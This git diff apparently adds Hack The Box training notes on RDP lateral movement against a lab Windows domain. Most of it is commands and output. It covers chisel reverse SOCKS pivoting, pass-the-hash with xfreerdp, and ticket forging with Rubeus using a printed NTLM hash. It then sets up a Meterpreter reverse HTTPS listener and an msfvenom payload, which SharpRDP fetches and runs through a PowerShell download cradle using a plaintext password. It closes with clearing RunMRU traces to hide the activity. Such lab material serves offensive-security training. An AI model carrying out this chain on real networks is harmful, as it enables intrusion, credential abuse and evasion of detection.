@@ -146,4 +146,171 @@ And to disable `Restricted Admin Mode`, set the `DisableRestrictedAdmin` value t
 C:\Tools> reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /d 1 /t REG_DWORD
 ```
 
-...
+#### Pivoting
+
+It is common that you will need to use pivoting to perform lateral movement.
+
+You will need to configure a SOCKS5 proxy on port 1080 in the `/etc/proxychains.conf` file:
+
+```bash
+d41y@htb[/htb]$ cat /etc/proxychains.conf | grep -Ev '(^#|^$)' | grep socks
+socks5 127.0.0.1 1080
+```
+
+Next, on your Linux machine, you will initiate reverse port forwarding server:
+
+```bash
+d41y@htb[/htb]$ ./chisel server --reverse 
+2024/03/28 07:09:08 server: Reverse tunnelling enabled
+2024/03/28 07:09:08 server: Fingerprint AKOstLSoSTPQPp2PVEALM6z9Jx0IQVEEmO7bOSan1s4=
+2024/03/28 07:09:08 server: Listening on http://0.0.0.0:8080
+2024/03/28 07:10:49 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
+```
+
+Then, in SRV01, you will connect to the server with the following command: `chisel.exe client <VPN IP> R:socks`
+
+```powershell
+PS C:\Tools> .\chisel.exe client 10.10.14.207:8080 R:socks
+2024/03/28 06:10:48 client: Connecting to ws://10.10.14.207:8080
+2024/03/28 06:10:49 client: Connected (Latency 137.6381ms)
+```
+
+#### PtH and PtT
+
+Once you confirm `Restricted Admin Mode` is enabled, or if you can enable it, you can proceed to perform PtH or PtT attacks with RDP.
+
+To perform PtH from a Linux machine, you can use `xfreerdp` with the `/pth` option to use a hash and connect to RDP.
+
+```bash
+d41y@htb[/htb]$ proxychains4 -q xfreerdp /u:helen /pth:62EBA30320E250ECA185AA1327E78AEB /d:inlanefreight.local /v:172.20.0.52
+[13:11:55:443] [84886:84887] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
+[13:11:55:444] [84886:84887] [WARN][com.freerdp.crypto] - CN = SRV02.inlanefreight.local
+```
+
+For PtT you can use Rubeus. You will forge a ticket using Helen's hash. First you need to launch a sacrificial process with the option `createnetonly`:
+
+```powershell
+PS C:\Tools> .\Rubeus.exe createnetonly /program:powershell.exe /show
+```
+
+In the new PowerShell window you will use Helen's hash to forge a TGT:
+
+```powershell
+PS C:\Tools> .\Rubeus.exe asktgt /user:helen /rc4:62EBA30320E250ECA185AA1327E78AEB /domain:inlanefreight.local /ptt
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.3.2
+
+[*] Action: Ask TGT
+
+[*] Using rc4_hmac hash: 62EBA30320E250ECA185AA1327E78AEB
+[*] Building AS-REQ (w/ preauth) for: 'inlanefreight.local\helen'
+[*] Using domain controller: fe80::711d:1399:b85a:50c5%9:88
+[+] TGT request successful!
+[*] base64(ticket.kirbi):
+
+      doIFrjCCBaqgAwIBBaEDAgEWooIEsTCCBK1hggSpMIIEpaADAgEFoRUbE0lOTEFORUZSRUlHSFQuTE9D
+      ...SNIP...
+
+[+] Ticket successfully imported!
+...SNIP...
+```
+
+From the window where you imported the ticket, you can use the `mstsc /restrictedAdmin` command:
+
+```powershell
+PS C:\Tools> mstsc.exe /restrictedAdmin
+```
+
+It will open a window as the currently logged-in user. It doesn't matter if the name is not the same as the account you are trying to impersonate.
+
+![windows lateral movement 5](../../../images/windows_lateral_movement5.png)
+
+When you click login, it will allow you to connect to RDP using the hash:
+
+![windows lateral movement 6](../../../images/windows_lateral_movement6.png)
+
+#### SharpRDP
+
+... is a .NET tool that allows for non-graphical, authenticated remote command execution through RDP, leveraging the `mstscax.dll` library used by RDP clients. This tool can perform actions such as connecting, authenticating, executing commands, and disconnecting without needing a GUI client or SOCKS proxy.
+
+SharpRDP relies on the terminal services library and generates the required DLLs from the `mstscax.dll`. It uses an invisible Windows form to handle the terminal services connection object instantiation and perform actions needed for lateral movement.
+
+You will use Metasploit and PowerShell to execute commands on the target machine. In your Linux machine you will execute Metasploit to listen on port 8888:
+
+```bash
+d41y@htb[/htb]$ msfconsole -x "use multi/handler;set payload windows/x64/meterpreter/reverse_https; set LHOST 10.10.14.207; set LPORT 8888; set EXITONSESSION false; set EXITFUNC thread; run -j"
+```
+
+Then you will generate a payload with msfvenom using PowerShell reflection:
+
+```bash
+d41y@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.207 LPORT=8888 -f psh-reflection -o s
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 774 bytes
+Final size of psh-reflection file: 3543 bytes
+Saved as: s
+```
+
+Next you use Python http server to host your payload:
+
+```bash
+d41y@htb[/htb]$ sudo python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+```
+
+Now you can use SharpRDP to execute a PowerShell command to execute your payload and provide a session:
+
+```powershell
+PS C:\Tools> .\SharpRDP.exe computername=srv01 command="powershell.exe IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.207/s')" username=inlanefreight\helen password=RedRiot88
+[+] Connected to          :  srv01
+[+] Execution priv type   :  non-elevated
+[+] Executing powershell.exe iex(new-object net.webclient).downloadstring('http://10.10.14.207/s')
+[+] Disconnecting from    :  srv01
+[+] Connection closed     :  srv01
+```
+
+> [!NOTE]
+> The execution of commands of SharpRDP is limited to 259 chars.
+
+SharpRDP uses Microsoft Terminal Services to execute commands, leaving traces of command execution within the `RunMRU` registry key (_`HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` or `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU`_). You can use [CleanRUNMR](https://github.com/0xthirteen/CleanRunMRU) to clean all command records. To compile the tool, you can use the built-in Microsoft `csc` compiler tool. First, transfer CleanRunMRU's `Program.cs` file from your attack host to the target computer:
+
+```powershell
+PS C:\Tools> wget -Uri http://10.10.14.207/CleanRunMRU/CleanRunMRU/Program.cs -OutFile CleanRunMRU.cs
+```
+
+Now you can use `csc.exe` to compile it:
+
+```powershell
+PS C:\Tools> C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe .\CleanRunMRU.cs
+Microsoft (R) Visual C# Compiler version 4.7.3190.0
+for C# 5
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+This compiler is provided as part of the Microsoft (R) .NET Framework, but only supports language versions up to C# 5, which is no longer the latest version. For compilers that support newer versions of the C# programming language, see http://go.microsoft.com/fwlink/?LinkID=533240
+```
+
+Now you can use `CleanRunMRU.exe` to clear all commands:
+
+```powershell
+PS C:\Tools> .\CleanRunMRU.exe  clearall
+HKCU:Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
+[+] Cleaned all RunMRU values
+```
+
+#### Advantages
+
+RDP provides several advantages for lateral movement, making it a preferred method for attackers in certain scenarios. Some of the key advantages include:
+
+- **Evade detection**: RDP traffic is common in business environments, making it less likely to raise suspicion.
+- **Non-Admin Access**: RDP access does not necessarily require administrative rights; a non-admin user can also have RDP access.
+- **Persistent Access**: Once a foothold is established, RDP can provide persistent access to the network.
+
